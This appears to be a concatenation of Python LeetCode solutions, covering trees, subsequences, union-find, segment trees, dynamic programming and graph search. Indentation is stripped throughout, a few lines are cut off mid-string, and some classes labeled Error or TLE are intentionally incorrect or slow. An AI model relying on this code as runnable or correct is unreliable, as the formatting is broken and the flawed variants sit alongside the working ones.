ret.append(self.encode(cur.left))
if cur.right: q.append(cur.right)
ret.append(self.encode(cur.right))
q = q[l:]
return ",".join(ret)
def deserialize(self, data):
lst = data.split(",")
root = self.decode(lst[0])
q = deque([root])
i = 1
while q:
cur = q.popleft()
if i < len(lst):
cur.left = self.decode(lst[i])
i += 1
if cur.left: q.append(cur.left)
if i < len(lst):
cur.right = self.decode(lst[i])
i += 1
if cur.right: q.append(cur.right)
return root
def decode(self, s):
if s == "null":
return None
else:
return TreeNode(int(s))
def encode(self, node):
if not node:
return "null"
else:
return str(node.val)
class TreeNode(object):
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Solution(object):
def __init__(self):
self.gmax = 0
def longestConsecutive(self, root):
self.longest(root)
return self.gmax
def longest(self, cur):
if not cur:
return 0
maxa = 1
l = self.longest(cur.left)
r = self.longest(cur.right)
if cur.left and cur.val+1 == cur.left.val:
maxa = max(maxa, l+1)
if cur.right and cur.val+1 == cur.right.val:
maxa = max(maxa, r+1)
self.gmax = max(self.gmax, maxa)
return maxa
def longestConsecutive_error(self, root):
if not root:
return 0
maxa = 1
l = self.longestConsecutive(root.left)
r = self.longestConsecutive(root.right)
maxa = max(maxa, l, r)
if root.left and root.val + 1 == root.left.val:
maxa = max(maxa, l+1)
if root.right and root.val + 1 == root.right.val:
maxa = max(maxa, r+1)
return maxa
from collections import defaultdict
class Solution(object):
def getHint(self, secret, guess):
cnt = defaultdict(int)
A = 0
B = 0
for c in secret:
cnt[c] += 1
for i, v in enumerate(guess):
if v == secret[i]:
A += 1
if cnt[v] > 0:
cnt[v] -= 1
else:
B -= 1
elif cnt[v] > 0:
B += 1
cnt[v] -= 1
return "%dA%dB" % (A, B)
if __name__ == "__main__":
assert Solution().getHint("0", "1") == "0A0B"
from typing import List
from bisect import bisect_left
class Solution:
def lengthOfLIS(self, nums: List[int]) -> int:
F = [float('inf') for _ in nums]
l = 0
for n in nums:
i = bisect_left(F, n)
F[i] = n
l = max(l, i + 1)
return l
import bisect
class Solution(object):
def lengthOfLIS(self, A):
if not A:
return 0
n = len(A)
MIN = [-1 for _ in xrange(n+1)]
k = 1
MIN[k] = A[0]
for v in A[1:]:
idx = bisect.bisect_left(MIN, v, 1, k+1)
MIN[idx] = v
k += 1 if idx == k+1 else 0
return k
def bin_search(self, M, A, t, lo=0, hi=None):
if not hi: hi = len(M)
while lo < hi:
m = (lo+hi)/2
if A[M[m]] == t:
return m
elif A[M[m]] < t:
lo = m + 1
else:
hi = m
return lo
def lengthOfLIS_output_all(self, A):
if not A:
return 0
n = len(A)
MIN = [-1 for _ in xrange(n+1)]
RET = [-1 for _ in xrange(n)]
l = 1
MIN[l] = 0
for i in xrange(1, n):
if A[i] > A[MIN[l]]:
l += 1
MIN[l] = i
RET[i] = MIN[l-1]
else:
j = self.bin_search(MIN, A, A[i], 1, l+1)
MIN[j] = i
RET[i] = MIN[j-1] if j-1 >= 1 else -1
cur = MIN[l]
ret = []
while True:
ret.append(A[cur])
if RET[cur] == -1: break
cur = RET[cur]
ret = ret[::-1]
print ret
return l
def lengthOfLIS_dp(self, A):
if not A:
return 0
n = len(A)
F = [1 for _ in xrange(n)]
maxa = 1
for i in xrange(1, n):
F[i] = max(
F[j] + 1 if A[i] > A[j] else 1
for j in xrange(i)
)
maxa = max(maxa, F[i])
return maxa
if __name__ == "__main__":
assert Solution().lengthOfLIS([10, 9, 2, 5, 3, 7, 101, 18]) == 4
class Solution(object):
def removeInvalidParentheses(self, s):
rmcnt = self.minrm(s)
ret = []
self.dfs(s, "", 0, None, 0, rmcnt, ret)
return ret
def minrm(self, s):
rmcnt = 0
left = 0
for c in s:
if c == "(":
left += 1
elif c == ")":
if left > 0:
left -= 1
else:
rmcnt += 1
rmcnt += left
return rmcnt
def dfs(self, s, cur, left, pi, i, rmcnt, ret):
if left < 0 or rmcnt < 0 or i > len(s):
return
if i == len(s):
if rmcnt == 0 and left == 0:
ret.append(cur)
return
if s[i] not in ("(", ")"):
self.dfs(s, cur+s[i], left, None, i+1, rmcnt, ret)
else:
if pi == s[i]:
while i < len(s) and pi and pi == s[i]: i, rmcnt = i+1, rmcnt-1
self.dfs(s, cur, left, pi, i, rmcnt, ret)
else:
self.dfs(s, cur, left, s[i], i+1, rmcnt-1, ret)
L = left+1 if s[i] == "(" else left-1
self.dfs(s, cur+s[i], L, None, i+1, rmcnt, ret)
if __name__ == "__main__":
assert Solution().removeInvalidParentheses("(a)())()") == ['(a())()', '(a)()()']
import bisect
class Solution(object):
def minArea(self, image, x, y):
m, n = len(image), len(image[0])
yaxis = [
1 if any(image[i][j] == "1" for i in xrange(m)) else 0
for j in xrange(n)
]
xaxis = [
1 if any(image[i][j] == "1" for j in xrange(n)) else 0
for i in xrange(m)
]
y_lo = bisect.bisect_left(yaxis, 1, 0, y)
y_hi = bisect.bisect_left(map(lambda e: 1^e, yaxis), 1, y)
x_lo = bisect.bisect_left(xaxis, 1, 0, x)
x_hi = bisect.bisect_left(map(lambda e: 1^e, xaxis), 1, x)
return (y_hi-y_lo)*(x_hi-x_lo)
if __name__ == "__main__":
image = [
"00",
"10",
]
assert Solution().minArea(image, 1, 0) == 1
class NumArray(object):
def __init__(self, nums):
n = len(nums)
self.F = [0 for _ in xrange(n+1)]
for i in xrange(1, n+1):
self.F[i] = self.F[i-1] + nums[i-1]
def sumRange(self, i, j):
return self.F[j+1] - self.F[i]
class NumMatrix(object):
def __init__(self, matrix):
m = len(matrix)
if m == 0:
self.F = None
return
n = len(matrix[0])
self.F = [[0 for _ in xrange(n+1)] for _ in xrange(m+1)]
for i in xrange(1, m+1):
for j in xrange(1, n+1):
self.F[i][j] = self.F[i-1][j]+self.F[i][j-1]-self.F[i-1][j-1]+matrix[i-1][j-1]
def sumRegion(self, row1, col1, row2, col2):
if not self.F:
return 0
return self.F[row2+1][col2+1] - self.F[row2+1][col1] - self.F[row1][col2+1] + self.F[row1][col1]
from collections import namedtuple
class UnionFind(object):
def __init__(self, rows, cols):
self.pi = [-1 for _ in xrange(rows*cols)]
self.sz = [-1 for _ in xrange(rows*cols)]
self.count = 0
def add(self, item):
if self.pi[item] == -1:
self.pi[item] = item
self.sz[item] = 1
self.count += 1
def union(self, a, b):
pi1 = self._pi(a)
pi2 = self._pi(b)
if pi1 != pi2:
if self.sz[pi1] > self.sz[pi2]:
pi1, pi2 = pi2, pi1
self.pi[pi1] = pi2
self.sz[pi2] += self.sz[pi1]
self.count -= 1
def _pi(self, item):
pi = self.pi[item]
if item != pi:
self.pi[item] = self._pi(pi)
return self.pi[item]
Op = namedtuple('Op', 'r c')
class Solution:
def __init__(self):
self.dirs = ((-1, 0), (1, 0), (0, -1), (0, 1))
def numIslands2(self, n, m, operators):
rows = n
cols = m
unroll = lambda x, y: x*cols + y
mat = [[0 for _ in xrange(cols)] for _ in xrange(rows)]
uf = UnionFind(rows, cols)
ret = []
for op in operators:
op = Op(r=op[0], c=op[1])
uf.add(unroll(op.r, op.c))
mat[op.r][op.c] = 1
for dir in self.dirs:
x1 = op.r+dir[0]
y1 = op.c+dir[1]
if 0 <= x1 < rows and 0 <= y1 < cols and mat[x1][y1] == 1:
uf.union(unroll(op.r, op.c), unroll(x1, y1))
ret.append(uf.count)
return ret
class Solution(object):
def isAdditiveNumber(self, num):
n = len(num)
for i in xrange(1, n):
for j in xrange(i, n):
if self.predicate(num, 0, i, j):
return True
return False
def predicate(self, s, b, i, j):
n1 = s[b:i]
n2 = s[i:j]
if b != 0 and j == len(s):
return True
if not n1 or not n2:
return False
if len(n1) > 1 and n1[0] == '0' or len(n2) > 1 and n2[0] == '0':
return False
n3 = str(int(n1)+int(n2))
J = j+len(n3)
if s[j:J] == n3:
return self.predicate(s, i, j, J)
if __name__ == "__main__":
assert Solution().isAdditiveNumber("12012122436")
class BinaryIndexTree(object):
def __init__(self, nums):
n = len(nums)
self.nums = [0 for _ in xrange(n+1)]
self.N = [0 for _ in xrange(n+1)]
for i, v in enumerate(nums):
self.set(i+1, v)
def _lowbit(self, a):
return a & -a
def set(self, i, val):
diff = val - self.nums[i]
self.nums[i] = val
while i < len(self.N):
self.N[i] += diff
i += self._lowbit(i)
def get(self, i):
ret = 0
while i > 0:
ret += self.N[i]
i -= self._lowbit(i)
return ret
class NumArray(object):
def __init__(self, nums):
self.bit = BinaryIndexTree(nums)
def update(self, i, val):
self.bit.set(i+1, val)
def sumRange(self, i, j):
return self.bit.get(j+1)-self.bit.get(i)
class Solution(object):
def maxProfit(self, A):
n = len(A)
if n == 0 or n == 1:
return 0
if n == 2:
return max(0, A[1]-A[0])
CD = 1
F = [0 for _ in xrange(n)]
M = [0 for _ in xrange(n)]
F[1] = A[1]-A[0]
M[1] = max(M[0], F[1])
F[2] = max(A[2]-A[2-1-i] for i in xrange(2))
M[2] = max(M[1], F[2])
for i in xrange(3, n):
F[i] = max(F[i-1]+A[i]-A[i-1], M[i-2-CD]+A[i]-A[i-1])
M[i] = max(M[i-1], F[i])
return M[-1]
if __name__ == "__main__":
assert Solution().maxProfit([1, 2, 3, 0, 2]) == 3
from collections import defaultdict
class Solution(object):
def findMinHeightTrees(self, n, edges):
if not edges:
return [0]
V = {i: [] for i in xrange(n)}
for a, b in edges:
V[a].append(b)
V[b].append(a)
_, _, last = self.bfs(0, V)
level, pi, last = self.bfs(last, V)
ret = []
cur = last
for _ in xrange((level-1)/2):
cur = pi[cur]
ret.append(cur)
if level%2 == 0:
ret.append(pi[cur])
return ret
def bfs(self, s, V):
visited = [False for _ in xrange(len(V))]
pi = [-1 for _ in xrange(len(V))]
last = s
level = 0
q = []
q.append(s)
while q:
l = len(q)
for i in xrange(l):
cur = q[i]
last = cur
visited[cur] = True
for nbr in V[cur]:
if not visited[nbr]:
pi[nbr] = cur
q.append(nbr)
q = q[l:]
level += 1
return level, pi, last
class Solution_TLE(object):
def findMinHeightTrees_TLE(self, n, edges):
if not edges:
return 0
V = {i: [] for i in xrange(n)}
for a, b in edges:
V[a].append(b)
V[b].append(a)
ret = []
mini = n
for k in V.keys():
l = self.bfs(k, V)
if l < mini:
ret = [k]
mini = l
elif l == mini:
ret.append(k)
return ret
def bfs(self, s, V):
visisted = [False for _ in xrange(len(V))]
q = []
level = 0
q.append(s)
while q:
l = len(q)
for i in xrange(l):
cur = q[i]
visisted[cur] = True
for nbr in V[cur]:
if not visisted[nbr]:
q.append(nbr)
q = q[l:]
level += 1
return level
class SolutionError(object):
def findMinHeightTrees(self, n, edges):
if not edges:
return 0
V = {i: [] for i in xrange(n)}
for a, b in edges:
V[a].append(b)
V[b].append(a)
leaf = None
for k, v in V.items():
if len(v) == 1:
leaf = k
break
visisted = [False for _ in xrange(n)]
h2v = defaultdict(list)
q = []
level = 0
q.append(leaf)
while q:
l = len(q)
for i in xrange(l):
cur = q[i]
h2v[level].append(cur)
visisted[cur] = True
for nbr in V[cur]:
if not visisted[nbr]:
q.append(nbr)
q = q[l:]
level += 1
if level%2 == 0:
return h2v[level/2-1]+h2v[level/2]
else:
return h2v[level/2]
if __name__ == "__main__":
assert Solution().findMinHeightTrees(7, [[0, 1], [1, 2], [1, 3], [2, 4], [3, 5], [4, 6]]) == [1, 2]
class Solution(object):
def multiply(self, A, B):
m, n = len(A), len(A[0])
A1 = [{} for _ in xrange(m)]
for i in xrange(m):
for j in xrange(n):
if A[i][j] != 0:
A1[i][j] = A[i][j]
m, n = len(B), len(B[0])
B1 = [{} for _ in xrange(n)]
for i in xrange(m):
for j in xrange(n):
if B[i][j] != 0:
B1[j][i] = B[i][j]
ret = [[0 for _ in xrange(len(B[0]))] for _ in xrange(len(A))]
for i, row in enumerate(A1):
for j, col in enumerate(B1):
s = 0
for k in row.keys():
if k in col:
s += row[k]*col[k]
ret[i][j] = s
return ret
if __name__ == "__main__":
A = [
[1, 0, 0],
[-1, 0, 3]
]
B = [
[7, 0, 0],
[0, 0, 0],
[0, 0, 1]
]
assert Solution().multiply(A, B) == [[7, 0, 0], [-7, 0, 3]]
class Solution(object):
def maxCoins(self, A):
n = len(A)
def get(i):
if i < 0 or i >= n: return 1
return A[i]
F = [[0 for _ in xrange(n+1)] for _ in xrange(n+1)]
for i in xrange(n+1, -1, -1):
for j in xrange(i+1, n+1):
F[i][j] = max(
F[i][k]+get(i-1)*get(k)*get(j)+F[k+1][j]
for k in xrange(i, j)
)
return max(map(max, F))
if __name__ == "__main__":
assert Solution().maxCoins([3, 1, 5, 8]) == 167
import heapq
from collections import deque
import sys
class Solution(object):
def nthSuperUglyNumber(self, n, primes):
k = len(primes)
ret = [sys.maxint for _ in xrange(n)]
ret[0] = 1
idxes = [0 for _ in xrange(k)]
for i in xrange(1, n):
for j in xrange(k):
ret[i] = min(ret[i], primes[j]*ret[idxes[j]])
for j in xrange(k):
if ret[i] == primes[j]*ret[idxes[j]]:
idxes[j] += 1
return ret[n-1]
class QueueWrapper(object):
def __init__(self, idx, q):
self.idx = idx
self.q = q
def __cmp__(self, other):
return self.q[0] - other.q[0]
class SolutionHeap(object):
def nthSuperUglyNumber(self, n, primes):
ret = 1
h = [QueueWrapper(i, deque([v])) for i, v in enumerate(primes)]
dic = {e.idx: e for e in h}
heapq.heapify(h)
for _ in xrange(n-1):
mini = heapq.heappop(h)
ret = mini.q.popleft()
for i in xrange(mini.idx, len(primes)):
dic[i].q.append(ret*primes[i])
heapq.heappush(h, mini)
return ret
if __name__ == "__main__":
assert Solution().nthSuperUglyNumber(12, [2, 7, 13, 19]) == 32
class TreeNode(object):
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Solution(object):
def verticalOrder(self, root):
l = self.leftmost(root, 0)
r = self.rightmost(root, 0)
ret = [[] for _ in xrange(r-l-1)]
self.bfs(root, -l-1, ret)
return ret
def bfs(self, cur, col, ret):
q = []
if cur:
q.append((cur, col))
while q:
l = len(q)
for i in xrange(l):
v, c = q[i]
ret[c].append(v.val)
if v.left: q.append((v.left, c-1))
if v.right: q.append((v.right, c+1))
q = q[l:]
def leftmost(self, cur, l):
if not cur: return l
return min(self.leftmost(cur.left, l-1), self.leftmost(cur.right, l+1))
def rightmost(self, cur, r):
if not cur: return r
return max(self.rightmost(cur.left, r-1), self.rightmost(cur.right, r+1))
def sidemost(self, cur, p, f):
if not cur: return p
return f(self.sidemost(cur.left, p-1, f), self.sidemost(cur.right, p+1, f))
class TreeNode(object):
def __init__(self, start, end, cnt=0):
self.start = start
self.end = end
self.cnt = cnt
self.left = None
self.right = None
class SegmentTree(object):
def __init__(self, n):
self.root = self.build(0, n)
def build(self, start, end):
if start >= end: return
if start == end-1: return TreeNode(start, end)
node = TreeNode(start, end)
node.left = self.build(start, (start+end)/2)
node.right = self.build((start+end)/2, end)
return node
def inc(self, idx, val):
cur = self.root
while cur:
cur.cnt += val
mid = (cur.start+cur.end)/2
if cur.start <= idx < mid:
cur = cur.left
elif mid <= idx < cur.end:
cur = cur.right
else:
return
def query_less(self, cur, idx):
if not cur:
return 0
mid = (cur.start+cur.end)/2
if cur.start <= idx < mid:
return self.query_less(cur.left, idx)
elif mid <= idx < cur.end:
return (cur.left.cnt if cur.left else 0) + self.query_less(cur.right, idx)
else:
return 0
class Solution(object):
def countSmaller(self, nums):
h = {}
for i, v in enumerate(sorted(nums)):
h[v] = i
A = [h[v] for v in nums]
n = len(A)
st = SegmentTree(n)
ret = []
for i in xrange(n-1, -1, -1):
ret.append(st.query_less(st.root, A[i]))
st.inc(A[i], 1)
return ret[::-1]
if __name__ == "__main__":
assert Solution().countSmaller([5, 2, 6, 1]) == [2, 1, 1, 0]
assert Solution().countSmaller([-1, -1]) == [0, 0]
class Solution(object):
def removeDuplicateLetters(self, s):
last_pos = [-1 for _ in xrange(26)]
n = len(s)
for i in xrange(n-1, -1, -1):
if last_pos[self._idx(s[i])] == -1:
last_pos[self._idx(s[i])] = i
stk = []
stk_set = set()
for i in xrange(n):
v = s[i]
if v not in stk_set:
while stk and stk[-1] > v and last_pos[self._idx(stk[-1])] > i:
p = stk.pop()
stk_set.remove(p)
stk.append(v)
stk_set.add(v)
return "".join(stk)
def _idx(self, x):
return ord(x) - ord('a')
if __name__ == "__main__":
assert Solution().removeDuplicateLetters("cbacdcbc") == "acdb
import sys
class Solution(object):
def __init__(self):
self.dirs = [(-1, 0), (1, 0), (0, -1), (0, 1)]
def shortestDistance(self, grid):
m = len(grid)
n = len(grid[0])
acc = [[0 for _ in xrange(n)] for _ in xrange(m)]
reachable = [[True for _ in xrange(n)] for _ in xrange(m)]
for i in xrange(m):
for j in xrange(n):
if grid[i][j] > 0:
reachable[i][j] = False
acc[i][j] = sys.maxint
for i in xrange(m):
for j in xrange(n):
if grid[i][j] == 1:
self.bfs(grid, acc, reachable, i, j)
mini = sys.maxint
for i in xrange(m):
for j in xrange(n):
if acc[i][j] < mini and reachable[i][j]:
mini = acc[i][j]
return mini if mini != sys.maxint else -1
def bfs(self, grid, acc, reachable, x, y):
d = 0
m, n = len(grid), len(grid[0])
visited = [[False for _ in xrange(n)] for _ in xrange(m)]
q = [(x, y)]
visited[x][y] = True
while q:
l = len(q)
for idx in xrange(l):
i, j = q[idx]
acc[i][j] += d
for dir in self.dirs:
I = i+dir[0]
J = j+dir[1]
if 0 <= I < m and 0 <= J < n and grid[I][J] == 0 and not visited[I][J]:
q.append((I, J))
visited[I][J] = True
d += 1
q = q[l:]
for i in xrange(m):
for j in xrange(n):
if not visited[i][j]:
reachable[i][j] = False
if __name__ == "__main__":
assert Solution().shortestDistance(
[[1, 1, 1, 1, 1, 0], [0, 0, 0, 0, 0, 1], [0, 1, 1, 0, 0, 1], [1, 0, 0, 1, 0, 1], [1, 0, 1, 0, 0, 1],
[1, 0, 0, 0, 0, 1], [0, 1, 1, 1, 1, 0]]) == 88
assert Solution().shortestDistance([[1, 2, 0]]) == -1
assert Solution().shortestDistance([[1, 0, 2, 0, 1], [0, 0, 0, 0, 0], [0, 0, 1, 0, 0]]) == 7
class Solution(object):
def maxProduct(self, words):
l = map(len, words)
codes = map(self.encode, words)
maxa = 0
for i in xrange(len(codes)):
for j in xrange(i+1, len(codes)):
if codes[i] & codes[j] == 0:
maxa = max(maxa, l[i]*l[j])
return maxa
def encode(self, x):
ret = 0
for c in x:
ret |= 1 << (ord(c)-ord('a'))
return ret
if __name__ == "__main__":
assert Solution().maxProduct(["abcw", "baz", "foo", "bar", "xtfn", "abcdef"]) == 16
import math
class Solution(object):
def bulbSwitch(self, n):
cnt = int(math.sqrt(n))
return cnt
from collections import defaultdict
class Solution(object):
def generateAbbreviations(self, word):
if not word:
return [""]
ret = []
for i in xrange(len(word)+1):
left_num = str(i) if i else ""
for right in self.generateAbbreviations(word[i+1:]):
cur = left_num + word[i:i+1] + right
ret.append(cur)
return ret
class SolutionTLE(object):
def __init__(self):
self.cache = defaultdict(list)
def generateAbbreviations(self, word):
return list(set(self.dfs(word)))
def dfs(self, word):
if word not in self.cache:
ret = []
for l in xrange(1, len(word)+1):
pivot = str(l)
for i in xrange(len(word)-l+1):
lefts = self.dfs(word[:i])
rights = self.dfs(word[i+l:])
for left in lefts:
for right in rights:
if left and left[-1].isdigit() or right and right[0].isdigit():
continue
ret.append(left+pivot+right)
ret.append(word)
self.cache[word] = ret
return self.cache[word]
if __name__ == "__main__":
assert Solution().generateAbbreviations("word") == ['word', 'wor1', 'wo1d', 'wo2', 'w1rd', 'w1r1', 'w2d', 'w3',
'1ord', '1or1', '1o1d', '1o2', '2rd', '2r1', '3d', '4']
class SolutionTLE(object):
def maxNumber(self, nums1, nums2, k):
maxa = []
n1, n2 = len(nums1), len(nums2)
for l1 in xrange(min(n1, k)+1):
l2 = k - l1
assert l2 >= 0
A1, A2 = self.maxNumberSingle(nums1, l1), self.maxNumberSingle(nums2, l2)
cur = self.maxNumberDual(A1, A2)
if not maxa or self.eval(maxa) < self.eval(cur):
maxa = cur
return maxa
def eval(self, lst):
return int("".join(map(str, lst)))
def maxNumberSingle(self, A, k):
stk = []
n = len(A)
for i in xrange(n):
while stk and len(stk)-1+(n-1-i+1) >= k and stk[-1] < A[i]: stk.pop()
if len(stk) < k:
stk.append(A[i])
return stk
def maxNumberDual(self, A1, A2):
ret = []
p1, p2 = 0, 0
while p1 < len(A1) and p2 < len(A2):
ahead1, ahead2 = p1, p2
while ahead1 < len(A1) and ahead2 < len(A2) and A1[ahead1] == A2[ahead2]:
ahead1, ahead2 = ahead1+1, ahead2+1
if ahead2 >= len(A2) or (ahead1 < len(A1) and A1[ahead1] > A2[ahead2]):
ret.append(A1[p1])
p1 += 1
else:
ret.append(A2[p2])
p2 += 1
ret.extend(A1[p1:])
ret.extend(A2[p2:])
return ret
import sys
class Solution(object):
def coinChange(self, coins, amount):
if amount == 0:
return 0
F = [sys.maxint for _ in xrange(amount+1)]
for k in coins:
if k < amount+1:
F[k] = 1
for i in xrange(1, amount+1):
if F[i] != sys.maxint:
for k in coins:
if i+k <= amount:
F[i+k] = min(F[i+k], F[i]+1)
return F[amount] if F[amount] != sys.maxint else -1
class SolutionTLE(object):
def coinChange(self, coins, amount):
F = [sys.maxint for _ in xrange(amount+1)]
for k in coins:
if k < amount + 1:
F[k] = 1
for i in xrange(1, amount+1):
for k in coins:
if i-k > 0 and F[i-k] != sys.maxint:
F[i] = min(F[i], F[i-k]+1)
return F[amount] if F[amount] != sys.maxint else -1
if __name__ == "__main__":
assert Solution().coinChange([243, 291, 335, 209, 177, 345, 114, 91, 313, 331], 7367) == 23
class Solution(object):
def countComponents(self, n, edges):
V = [[] for _ in xrange(n)]
for e in edges:
V[e[0]].append(e[1])
V[e[1]].append(e[0])
visited = [False for _ in xrange(n)]
cnt = 0
for v in xrange(n):
if not visited[v]:
cnt += 1
self.dfs(V, v, visited)
return cnt
def dfs(self, V, v, visited):
visited[v] = True
for nbr in V[v]:
if not visited[nbr]:
self.dfs(V, nbr, visited)
from typing import List
class Solution:
def wiggleSort(self, nums: List[int]) -> None:
n = len(nums)
median = list(sorted(nums))[n//2]
odd = 1
even = n - 1 if (n - 1) % 2 == 0 else n - 2
i = 0
while i < n:
if nums[i] < median:
if i >= even and i % 2 == 0:
i += 1
continue
nums[i], nums[even] = nums[even], nums[i]
even -= 2
elif nums[i] > median:
if i <= odd  and i % 2 == 1:
i += 1
continue
nums[i], nums[odd] = nums[odd], nums[i]
odd += 2
else:
i += 1
def find_kth(self, A, lo, hi, k):
p = self.pivot(A, lo, hi)
if k == p:
return p
elif k > p:
return self.find_kth(A, p + 1, hi, k)
else:
return self.find_kth(A, lo, p, k)
def pivot(self, A, lo, hi):
p = lo
closed = lo
for i in range(lo + 1, hi):
if A[i] < A[p]:
closed += 1
A[closed], A[i] = A[i], A[closed]
A[closed], A[p] = A[p], A[closed]
return closed
if __name__ == "__main__":
Solution().wiggleSort([1, 5, 1, 1, 6, 4])
class Solution(object):
def wiggleSort(self, A):
n = len(A)
median_idx = self.find_kth(A, 0, n, n/2)
v = A[median_idx]
idx = lambda i: (2*i+1) % (n|1)
lt = -1
hi = n
i = 0
while i < hi:
if A[idx(i)] > v:
lt += 1
A[idx(lt)], A[idx(i)] = A[idx(i)], A[idx(lt)]
i += 1
elif A[idx(i)] == v:
i += 1
else:
hi -= 1
A[idx(hi)], A[idx(i)] = A[idx(i)], A[idx(hi)]
def pivot(self, A, lo, hi, pidx=None):
lt = lo-1
gt = hi
if not pidx: pidx = lo
v = A[pidx]
i = lo
while i < gt:
if A[i] < v:
lt += 1
A[lt], A[i] = A[i], A[lt]
i += 1
elif A[i] == v:
i += 1
else:
gt -= 1
A[gt], A[i] = A[i], A[gt]
return lt, gt
def find_kth(self, A, lo, hi, k):
if lo >= hi: return
lt, gt = self.pivot(A, lo, hi)
if lt < k < gt:
return k
if k <= lt:
return self.find_kth(A, lo, lt+1, k)
else:
return self.find_kth(A, gt, hi, k)
class SolutionSort(object):
def wiggleSort(self, nums):
n = len(nums)
A = sorted(nums)
j, k = (n-1) / 2, n-1
for i in xrange(len(nums)):
if i % 2 == 0:
nums[i] = A[j]
j -= 1
else:
nums[i] = A[k]
k -= 1
if __name__ == "__main__":
A = [3, 2, 1, 1, 3, 2]
Solution().wiggleSort(A)
print A
class Solution(object):
def maxSubArrayLen(self, A, k):
m = {0: -1}
maxa = 0
s = 0
for i in xrange(len(A)):
s += A[i]
t = s - k
if t in m:
maxa = max(maxa, i - m[t])
if s not in m:
m[s] = i
return maxa
class Solution(object):
def countRangeSum(self, nums, lower, upper):
if not nums: return 0
def msort(A, lo, hi):
if hi - lo <= 1: return 0
mid = (lo + hi)/2
cnt = msort(A, lo, mid) + msort(A, mid, hi)
temp = []
i = j = r = mid
for l in xrange(lo, mid):
while i < hi and A[i] - A[l] <  lower: i += 1
while j < hi and A[j] - A[l] <= upper: j += 1
cnt += j - i
while r < hi and A[r] < A[l]:
temp.append(A[r])
r += 1
temp.append(A[l])
while r < hi:
temp.append(A[r])
r += 1
A[lo:hi] = temp
return cnt
n = len(nums)
F = [0 for _ in xrange(n+1)]
for i in xrange(1, n+1):
F[i] = F[i-1] + nums[i-1]
return msort(F, 0, n+1)
if __name__ == "__main__":
assert Solution().countRangeSum([0, 0], 0, 0) == 3
assert Solution().countRangeSum([-2, 5, -1], -2, 2) == 3
class ListNode(object):
def __init__(self, x):
self.val = x
self.next = None
class Solution(object):
def oddEvenList(self, head):
if not head:
return
ptr = head
pre = head
cnt = 1
while pre and pre.next:
cur = pre.next
cnt += 1
if cnt % 2 == 0:
pre = pre.next
else:
start = ptr.next
nxt = cur.next
ptr.next = cur
cur.next = start
pre.next = nxt
ptr = ptr.next
return head
def oddEvenListError(self, head):
if not head:
return
ptr = head
parity = ptr.val % 2
pre = head
while pre and pre.next:
cur = pre.next
if cur.val % 2 != parity:
pre = pre.next
else:
start = ptr.next
nxt = cur.next
ptr.next = cur
cur.next = start
pre.next = nxt
ptr = ptr.next
return head
class Solution(object):
def __init__(self):
self.cache = None
self.dirs = ((-1, 0), (1, 0), (0, -1), (0, 1),)
def longestIncreasingPath(self, matrix):
if not matrix: return 0
m, n = len(matrix), len(matrix[0])
self.cache = [[None for _ in xrange(n)] for _ in xrange(m)]
gmax = 1
for i in xrange(m):
for j in xrange(n):
gmax = max(gmax, self.longest(matrix, i, j))
return gmax
def longest(self, matrix, i, j):
if not self.cache[i][j]:
m, n = len(matrix), len(matrix[0])
maxa = 1
for d in self.dirs:
I, J = i + d[0], j + d[1]
if 0 <= I < m and 0 <= J < n and matrix[I][J] > matrix[i][j]:
maxa = max(maxa, 1 + self.longest(matrix, I, J))
self.cache[i][j] = maxa
return self.cache[i][j]
if __name__ == "__main__":
assert Solution().longestIncreasingPath([
[9, 9, 4],
[6, 6, 8],
[2, 1, 1]
]) == 4
class Solution(object):
def minPatches(self, nums, n):
cnt = 0
cur_max = 0
i = 0
while cur_max < n:
if i >= len(nums) or cur_max + 1 < nums[i]:
cur_max += cur_max + 1
cnt += 1
else:
cur_max += nums[i]
i += 1
return cnt
def minPatches2(self, nums, n):
nums = filter(lambda x: x <= n, nums)
cnt = 0
cur_max = 0
for elt in nums:
while cur_max + 1 < elt:
cur_max += cur_max + 1
cnt += 1
cur_max += elt
while cur_max < n:
cur_max += cur_max + 1
cnt += 1
return cnt
if __name__ == "__main__":
assert Solution().minPatches([1, 2, 2, 6, 34], 20) == 1
class Solution(object):
def isValidSerialization(self, preorder):
stk = preorder.split(',')
child_cnt = 0
while stk:
if stk[-1] == '#':
stk.pop()
child_cnt += 1
else:
child_cnt -= 2
if child_cnt < 0:
return False
stk.pop()
child_cnt += 1
return not stk and child_cnt == 1
def isValidSerializationSpace(self, preorder):
stk = preorder.split(',')
child_stk = []
while stk:
if stk[-1] == '#':
child_stk.append(stk.pop())
else:
try:
child_stk.pop()
child_stk.pop()
stk.pop()
child_stk.append('#')
except IndexError:
return False
return not stk and len(child_stk) == 1
if __name__ == "__main__":
Solution().isValidSerialization("9,3,4,
import heapq
from collections import defaultdict, deque
class Solution(object):
def findItinerary(self, tickets):
G = defaultdict(list)
for s, e in tickets:
heapq.heappush(G[s], e)
ret = deque()
self.dfs(G, 'JFK', ret)
return list(ret)
def dfs(self, G, cur, ret):
while G[cur]:
self.dfs(G, heapq.heappop(G[cur]), ret)
ret.appendleft(cur)
if __name__ == "__main__":
assert Solution().findItinerary([["JFK","KUL"],["JFK","NRT"],["NRT","JFK"]]) == ['JFK', 'NRT', 'JFK', 'KUL']
import sys
class TreeNode(object):
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class BSTInfo(object):
def __init__(self, sz, lo, hi):
self.sz = sz
self.lo = lo
self.hi = hi
MAX = sys.maxint
MIN = -MAX - 1
class Solution(object):
def __init__(self):
self.gmax = 0
def largestBSTSubtree(self, root):
self.measure(root)
return self.gmax
def measure(self, root):
if not root:
return BSTInfo(0, MAX, MIN)
left = self.measure(root.left)
right = self.measure(root.right)
if left.sz == -1 or right.sz == -1 or not left.hi <= root.val or not root.val <= right.lo:
return BSTInfo(-1, MIN, MAX)
sz = 1 + left.sz + right.sz
self.gmax = max(self.gmax, sz)
return BSTInfo(sz, min(root.val, left.lo), max(root.val, right.hi))
class SolutionError(object):
def __init__(self):
self.gmax = 0
def largestBSTSubtree(self, root):
self.measure(root)
return self.gmax
def measure(self, root):
if not root:
return 0
left = self.measure(root.left)
right = self.measure(root.right)
if root.left and not root.val >= root.left.val or root.right and not root.val <= root.right.val:
return 0
if root.left and left == 0 or root.right and right == 0:
return 0
ret = 1 + left + right
self.gmax = max(self.gmax, ret)
return ret
if __name__ == "__main__":
root = TreeNode(1)
root.left = TreeNode(2)
print Solution().largestBSTSubtree(root)
from typing import List
from bisect import bisect_left
class Solution:
def increasingTriplet(self, nums: List[int]) -> bool:
F = [float('inf') for _ in range(3)]
for n in nums:
